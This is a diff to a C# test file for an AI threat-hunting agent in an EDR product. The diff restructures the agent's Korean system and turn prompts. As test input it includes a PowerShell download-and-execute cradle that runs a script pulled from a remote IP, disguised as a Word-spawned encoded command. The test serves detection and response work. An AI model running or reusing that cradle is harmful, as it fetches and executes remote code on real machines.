@@ -426,34 +426,50 @@ public class AutonomousHunterAgentTests
         Assert.NotNull(client);
 
         string systemInstruction = """
-            당신은 최첨단 엔터프라이즈 보안 EDR 'Phalanx'의 자율 AI 위협 헌터(Autonomous Hunter Agent)입니다.
-            Windows 커널 센서가 선제 동결한 회색지대 프로세스를 심층 조사하여 악성 여부를 가리고 사형(ACTION_KILL) 또는 동결해제(ACTION_RESUME)를 최종 판결해야 합니다.
-            
-            사용 가능한 5대 OS 조사 도구 목록:
-            1. DecodePayloadTool: Base64/Hex 난독화 명령줄 해독 (인자: encodedCommand)
-            2. ProcessMemoryScanTool: 동결된 프로세스 가상 메모리(RAM) 스캔 (인자: targetPid)
-            3. ThreatReputationTool: 추출된 IP/도메인 위협 평판 조회 (인자: targetIndicator)
-            4. MitreClassifierTool: 관찰된 행위를 MITRE ATT&CK Matrix TTP로 매핑 (인자: observedBehavior)
-            5. SystemFirewallTool: 악성 C2 통신 IP 윈도우 방화벽 인/아웃바운드 차단 (인자: maliciousIp)
+            <system_directive>
+            당신은 최첨단 엔터프라이즈 EDR 'Phalanx'의 자율 AI 위협 헌터(Autonomous Hunter Agent)입니다.
+            Windows 커널 센서가 24μs 만에 선제 동결한 의심 프로세스를 수사하여 최종 판결(사형: ACTION_KILL / 정상 복구: ACTION_RESUME)과 침해사고 공식 서사를 도출하십시오.
+            </system_directive>
 
-            [ReAct 멀티턴 에이전트 행동 규칙]
-            - 초기 단계에서는 증거가 불충분하므로 즉시 최종 판결을 내리지 말고 적절한 도구를 호출하십시오.
-            - 도구를 호출할 때에는 반드시 "is_final_verdict": false 로 설정하고, "action_tool"과 "action_args"를 명시하십시오.
-            - 도구 실행 결과([Observation])가 제공되면, 이를 바탕으로 다음 도구를 호출하거나 증거가 충분할 경우 최종 판결을 내리십시오.
-            - 최종 판결 시에는 반드시 "is_final_verdict": true 로 설정하고, "action_tool": "None", "verdict_action"("ACTION_KILL" 또는 "ACTION_RESUME"), "confidence_score", "summary_title", "narrative", "mitre_tactics"를 모두 작성하십시오.
+            <tools>
+            에이전트가 호출할 수 있는 5대 OS 수사 도구 규격:
+            1. DecodePayloadTool: Base64/Hex 난독화 명령줄을 재귀 해독 (매개변수: encodedCommand)
+            2. ProcessMemoryScanTool: 동결된 프로세스의 RAM 메모리를 스캔하여 인메모리 위협/URL 탐색 (매개변수: targetPid)
+            3. ThreatReputationTool: 추출된 통신 지표의 위협 인텔리전스 및 C2 평판 조회 (매개변수: targetIndicator)
+            4. MitreClassifierTool: 관찰된 공격 전술 체인을 MITRE ATT&CK Matrix TTP로 분류 (매개변수: observedBehavior)
+            5. SystemFirewallTool: 악성 C2 통신 IP에 대한 Windows 방화벽 즉시 차단 (매개변수: maliciousIp)
+            </tools>
 
-            반드시 아래 JSON 스키마 형식으로만 응답하십시오:
-            {
-              "thought": "프로세스 족보 및 도구 관찰 결과를 분석한 심층 추론 및 다음 행동 이유",
-              "action_tool": "호출할 도구 이름 (예: DecodePayloadTool, ProcessMemoryScanTool 등) 또는 최종 판결 시 'None'",
-              "action_args": { "인자명": "값" },
-              "is_final_verdict": true 또는 false,
-              "verdict_action": "ACTION_KILL" 또는 "ACTION_RESUME" (최종 판결 시 필수),
-              "confidence_score": 0.98,
-              "summary_title": "침해사고 한 줄 요약",
-              "narrative": "사건 발단부터 동결, 도구 조사 결과, 최종 사살/해제에 이르는 한국어 공식 침해사고 서사",
-              "mitre_tactics": ["T1566.001", "T1059.001"]
+            <rules>
+            1. 증거 수집 단계: 타깃의 행위가 악성인지 정상인지 입증할 구체적 증거가 부족한 경우, 반드시 is_final_verdict: false로 설정하고 조사에 필요한 최적의 도구와 인자를 제출하십시오.
+            2. 도구 관찰 분석: 이전 도구 실행 결과가 주어지면, 발견된 IoC(C2 IP, URL, 페이로드 등)를 바탕으로 추가 조사를 진행하거나 충분한 근거가 확보된 경우 최종 판결로 나아가십시오.
+            3. 최종 판결 단계: 위협 여부가 확증되면 반드시 is_final_verdict: true로 설정하고, action_tool: "None", verdict_action("ACTION_KILL" 또는 "ACTION_RESUME"), confidence_score, summary_title, narrative, mitre_tactics를 완성하십시오.
+            4. 페이로드 해독 우선: 명령줄에 Base64 난독화 인자(-enc)가 포함된 경우 최우선으로 DecodePayloadTool을 실행하여 실제 의도를 규명하십시오.
+            5. 응답 제약: 서론이나 마크다운 백틱(```) 없이 오직 아래 TypeScript 인터페이스 스키마를 만족하는 유효한 단일 JSON 객체만을 출력하십시오.
+            </rules>
+
+            <output_format>
+            interface AiInvestigationDecision {
+              thought: string;           // 족보 및 도구 관찰 결과를 분석한 한국어 심층 추론
+              action_tool: string;       // 호출할 도구명 또는 최종 판결 시 "None"
+              action_args: Record<string, any>; // 도구 실행 매개변수 (없을 경우 빈 객체)
+              is_final_verdict: boolean; // 최종 판결 도달 여부
+              verdict_action?: "ACTION_KILL" | "ACTION_RESUME"; // 최종 판결 시 필수
+              confidence_score: number;  // 0.0 ~ 1.0 (최종 판결 시 필수)
+              summary_title?: string;    // 침해사고 1줄 요약 제목
+              narrative?: string;        // 공식 침해사고 서사
+              mitre_tactics?: string[];  // 관련 MITRE ATT&CK TTP ID 목록
             }
+            </output_format>
+
+            <example>
+            {
+              "thought": "부모 프로세스 winword.exe가 powershell.exe를 기동하였으며 명령줄에 Base64 난독화(-enc)가 확인됩니다. 은닉된 실행 명령을 확인하기 위해 DecodePayloadTool을 호출합니다.",
+              "action_tool": "DecodePayloadTool",
+              "action_args": { "encodedCommand": "SQBuAHY..." },
+              "is_final_verdict": false
+            }
+            </example>
             """;
 
         string rawScript = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
@@ -461,15 +477,18 @@ public class AutonomousHunterAgentTests
         string fullCmd = $"powershell.exe -enc {b64}";
 
         string userPromptTurn1 = $"""
-            [동결된 타깃 프로세스 정보]
-            - PID: 8492
-            - 실행 이미지: powershell.exe
-            - 명령줄 인자: {fullCmd}
-            - 부모 프로세스: winword.exe (PID: 3104)
-            - 전체 족보 체인: powershell.exe(PID:8492) -> winword.exe(PID:3104)
-            - 상태: 동결됨(SUSPENDED, 24μs 원자적 동결 완료)
-            
-            타깃 프로세스의 위험성을 평가하고, 첫 번째로 실행할 OS 조사 도구를 JSON 형식으로 요청하십시오. (초기 단계에서는 is_final_verdict: false 로 도구를 호출해야 합니다)
+            <target_context>
+            - ProcessId: 8492
+            - ImageName: powershell.exe
+            - CommandLine: {fullCmd}
+            - ParentProcess: winword.exe (PID: 3104)
+            - AncestryChain: powershell.exe(PID:8492) -> winword.exe(PID:3104)
+            - Status: SUSPENDED (24μs 원자적 동결 완료, 메모리 보존 상태)
+            </target_context>
+
+            <final_instruction>
+            위 <target_context>의 정보를 정밀 분석하여, 첫 번째로 실행할 OS 조사 도구를 <output_format> 규격의 순수 JSON으로 제출하십시오. (증거 수집 단계이므로 is_final_verdict: false를 지정하십시오)
+            </final_instruction>
             """;
 
         var conversation = new List<Content>
@@ -501,10 +520,13 @@ public class AutonomousHunterAgentTests
         _output.WriteLine(toolResult.Output);
 
         string userPromptTurn2 = $"""
-            [Observation - 도구 'DecodePayloadTool' 실행 결과]
+            <tool_observation tool="DecodePayloadTool">
             {toolResult.Output}
+            </tool_observation>
 
-            위 관찰 결과를 바탕으로 다음 조치(추가 도구 호출 또는 is_final_verdict: true 최종 판결)를 결정하십시오.
+            <final_instruction>
+            위 <tool_observation>의 실행 결과를 면밀히 검토하여, 추가 조사가 필요하면 다음 도구를 호출하고, 위협 여부가 충분히 입증되었다면 is_final_verdict: true와 함께 최종 판결(ACTION_KILL 또는 ACTION_RESUME)을 제출하십시오.
+            </final_instruction>
             """;
 
         conversation.Add(new Content("user", new List<Part> { new Part(userPromptTurn2) }));
@@ -537,10 +559,13 @@ public class AutonomousHunterAgentTests
             _output.WriteLine(repResult.Output);
 
             string userPromptTurn3 = $"""
-                [Observation - 도구 'ThreatReputationTool' 실행 결과]
+                <tool_observation tool="ThreatReputationTool">
                 {repResult.Output}
+                </tool_observation>
 
-                위 관찰 결과를 바탕으로 최종 판결(is_final_verdict: true)을 결정하십시오.
+                <final_instruction>
+                위 <tool_observation>의 실행 결과를 면밀히 검토하여 최종 판결(is_final_verdict: true) 및 사형/정상 복구 결정을 제출하십시오.
+                </final_instruction>
                 """;
 
             conversation.Add(new Content("user", new List<Part> { new Part(userPromptTurn3) }));
